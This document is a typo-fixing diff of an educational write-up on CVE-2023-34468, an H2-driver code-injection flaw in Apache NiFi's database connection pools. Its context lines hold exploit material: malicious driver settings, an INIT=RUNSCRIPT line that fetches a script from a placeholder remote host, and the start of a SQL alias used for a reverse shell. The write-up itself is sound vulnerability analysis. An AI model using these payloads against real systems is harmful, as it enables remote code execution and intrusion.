@@ -19,7 +19,7 @@ This underlying weakness is annually one of the CWE™ Top 25 Most Dangerous Sof
 
 The first weakness exists when application's server component fails to properly validate untrusted user-controlled input leading to unexpected or undesirable outcomes on the server. 
 
-The second weakness occurs when the aformentioned untrusted input is provided as configuration to select a database driver. This external configuration allows for the user the dynamically control which backend driver the application will load. Since certain database drivers allow for generation of arbitrary code, the underlying application may be vulnerable to code injection.
+The second weakness occurs when the aforementioned untrusted input is provided as configuration to select a database driver. This external configuration allows for the user the dynamically control which backend driver the application will load. Since certain database drivers allow for generation of arbitrary code, the underlying application may be vulnerable to code injection.
 
 ```mermaid
 %%{init:{'theme':'dark'}}%%
@@ -47,13 +47,13 @@ sequenceDiagram
     end
 ```
 
-### Vulnerabilty:
+### Vulnerability:
 
 <a href="https://www.cve.org/CVERecord?id=CVE-2023-34468">CVE-2023-34468</a> - Published 12 June 2023, Updated 28 September 2023
 
-Apache NiFi is an open-source, distrubuted data processing system designed to automate various data flows betwen a wide range of systems. NiFi consists of a highly flexible processor / controller service framework that has fostered a rich ecosystem of pre-built components to interact with common technologies including (but not limited to) database systems, message queues, and APIs.
+Apache NiFi is an open-source, distributed data processing system designed to automate various data flows between a wide range of systems. NiFi consists of a highly flexible processor / controller service framework that has fostered a rich ecosystem of pre-built components to interact with common technologies including (but not limited to) database systems, message queues, and APIs.
 
-With this flexibility, comes the inherent risk of vulnerabilites simply due to the sheer attack surface. In 2023, a critical RCE vulnerabilty was found within a core abstraction for several database connector components that affected all major versions dating back to the inital release.
+With this flexibility comes the inherent risk of vulnerabilities simply due to the sheer attack surface. In 2023, a critical RCE vulnerability was found within a core abstraction for several database connector components that affected all major versions dating back to the initial release.
 
 The vulnerability is due to a lack of input validation at the configuration layer for two core database connector components that are implemented as controller services:
 
@@ -77,7 +77,7 @@ CALL EXEC('whoami')
 
 #### DBCPConnectionPool
 
-For the `DBCPConnectionPool`, the vulnerabilty stems from a lack of input validation on a `PropertyDescriptor` named `DATABASE_URL` within the `DBCPProperties`. This oversight allowed for mallicious use of the H2 database JAR (which is shipped by the default Apache NiFi distribution) to execute arbitrary Java code thus resulting in remote code execution.
+For the `DBCPConnectionPool`, the vulnerability stems from a lack of input validation on a `PropertyDescriptor` named `DATABASE_URL` within the `DBCPProperties`. This oversight allowed for malicious use of the H2 database JAR (which is shipped by the default Apache NiFi distribution) to execute arbitrary Java code thus resulting in remote code execution.
 
 
 ```diff
@@ -113,7 +113,7 @@ file:  nifi-nar-bundles/nifi-extension-utils/nifi-dbcp-base/src/main/java/org/ap
 -158     protected abstract DataSourceConfiguration getDataSourceConfiguration(final ConfigurationContext context);
 ```
 
-In the case of this vulnerabilty, it was utilized by the `DBCPConnectionPool` which provides an interface for database connection pooling.
+In the case of this vulnerability, it was utilized by the `DBCPConnectionPool` which provides an interface for database connection pooling.
 
 ```diff
 file: nifi-nar-bundles/nifi-standard-services/nifi-dbcp-service-bundle/nifi-dbcp-service/src/main/java/org/apache/nifi/dbcp/DBCPConnectionPool.java
@@ -125,7 +125,7 @@ file: nifi-nar-bundles/nifi-standard-services/nifi-dbcp-service-bundle/nifi-dbcp
  ...
 ```
 
-From there the `DataSourceConfiguration` is used to build a `BasicDataSource` instance variable for the `AbstractDBCPConnectionPool` which is used to fetch `java.sql.Connection` objects from the underlying datasource via the `getConnection` method. 
+From there the `DataSourceConfiguration` is used to build a `BasicDataSource` instance variable for the `AbstractDBCPConnectionPool` which is used to fetch `java.sql.Connection` objects from the underlying data-source via the `getConnection` method. 
 
 ```diff
  160 protected void configureDataSource(final ConfigurationContext context, final DataSourceConfiguration configuration) {
@@ -153,7 +153,7 @@ From there the `DataSourceConfiguration` is used to build a `BasicDataSource` in
  ...
 ```
 
-With all of this, NiFi is now going to interface with a SQL driver provided by the user regardless of what driver the user has selected. This exposes the underlying vulnerability, due to the H2 database JAR being put on the runtime classpath of the NiFi application.
+With all of this, NiFi is now going to interface with a SQL driver provided by the user regardless of what driver the user has selected. This exposes the underlying vulnerability, due to the H2 database JAR being put on the runtime class-path of the NiFi application.
 
 #### HikariCPConnectionPool
 
@@ -191,9 +191,9 @@ To exploit this vulnerability, an adversary can configure a `DBCPConnectionPool`
 |Database Driver Class Name | `org.h2.Driver` |
 |Database Driver Location | `work/nar/extensions/nifi-poi-nar-1.21.0.nar-unpacked/NAR-INF/bundled-dependencies/h2-2.1.214.jar` |
 
-**NOTE: The `Database Connection URL` can be given an initalization script to automatically create and execute the malicous java code (`INIT=RUNSCRIPT FROM "http://{REMOTE-HOST}"`)**
+**NOTE: The `Database Connection URL` can be given an initialization script to automatically create and execute the malicious java code (`INIT=RUNSCRIPT FROM "http://{REMOTE-HOST}"`)**
 
-Now any processor configured to use the `DBCPConnectionPool` will utilize the underlying embedded H2 database driver when connections are requested. Now malicious UDFs can be created an executed on the advarsary's command. The following is an example exploitation via a reverse shell:
+Now any processor configured to use the `DBCPConnectionPool` will utilize the underlying embedded H2 database driver when connections are requested. Now malicious UDFs can be created an executed on the adversary's command. The following is an example exploitation via a reverse shell:
 
 ```sql
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.Exception {
@@ -294,13 +294,13 @@ because security concerns must be known at the time of implementation in order f
 
 The flexible driver design where users have complete control over what driver is used could be replaced with an enumerated set of supported driver platforms. This approach would have prevented the unintended use of the H2 database because the developers would have never supported it in the first place.
 
-With that being said, since the design of the underlying technology is striving to be flexible for future extension, I understand the choices made by the developers. Trade offs were being made between flexibility and security, which is a very common theme accross all of software. Which makes it all the more important that 3rd party users of open source software understand the risks of flexibility.
+With that being said, since the design of the underlying technology is striving to be flexible for future extension, I understand the choices made by the developers. Trade offs were being made between flexibility and security, which is a very common theme across all of software. Which makes it all the more important that 3rd party users of open source software understand the risks of flexibility.
 
 Following the patch made in version 1.22.0, another validation related <a href="https://www.cve.org/CVERecord?id=CVE-2023-40037">CVE-2023-40037</a> was found for the exact same connector services, which required developers to add more validation in the `ConnectionURLValidator` to prevent more unintended consequences. This aligns with another CWE (<a href="https://cwe.mitre.org/data/definitions/184.html">CWE-184</a>) and is all the more reason for a redesigned approach.
 
 ### Conclusion:
 
-In conclusion, the vulnerability required immediate action by the development team and should be addressed by any organization using the tool in a production environment. This particular vulnerability illustrates the pros and cons of flexible application design, and how unchecked extensibility can lead to unintended consequences. It also exemplifies the importance of assumptions made by open-source technolgies, and when they align with use in a production enviroment.
+In conclusion, the vulnerability required immediate action by the development team and should be addressed by any organization using the tool in a production environment. This particular vulnerability illustrates the pros and cons of flexible application design, and how unchecked extensibility can lead to unintended consequences. It also exemplifies the importance of assumptions made by open-source technologies, and when they align with use in a production environment.
 
 Untrusted input comes in a wide variety of different formats and mediums, and it is paramount that developers protect systems at the front door so that applications behave as expected, and don't allow for uncontrolled access to anything beyond the developer's intention.
 
@@ -310,7 +310,7 @@ Untrusted input comes in a wide variety of different formats and mediums, and it
 - CVE-2023-34468 Entry: https://www.cve.org/CVERecord?id=CVE-2023-34468
 - CWE-20 Entry: https://cwe.mitre.org/data/definitions/20.html
 - CWK-94 Entry: https://cwe.mitre.org/data/definitions/94.html
-- NV Vulnerabilty Report: https://nvd.nist.gov/vuln/detail/cve-2023-34468
+- NV Vulnerability Report: https://nvd.nist.gov/vuln/detail/cve-2023-34468
 - Apache NiFi Security Reporting: https://nifi.apache.org/documentation/security/
 - Apache NiFi v1.22.0 Release Notes: https://issues.apache.org/jira/secure/ReleaseNote.jspa?projectId=12316020&version=12353069
 - JIRA Issue: https://issues.apache.org/jira/browse/NIFI-11653
